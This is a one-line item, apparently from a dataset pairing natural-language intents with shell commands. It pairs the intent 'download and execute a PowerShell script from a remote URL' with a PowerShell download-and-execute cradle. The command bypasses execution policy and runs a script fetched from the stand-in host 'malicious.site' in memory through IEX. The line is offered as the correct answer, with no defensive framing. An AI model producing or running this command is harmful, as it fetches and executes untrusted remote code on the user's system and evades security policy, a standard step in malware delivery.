# Natural language intent:
# Download and execute a PowerShell script from a remote URL with Bypass execution policy.

powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/evilFail.ps1')"
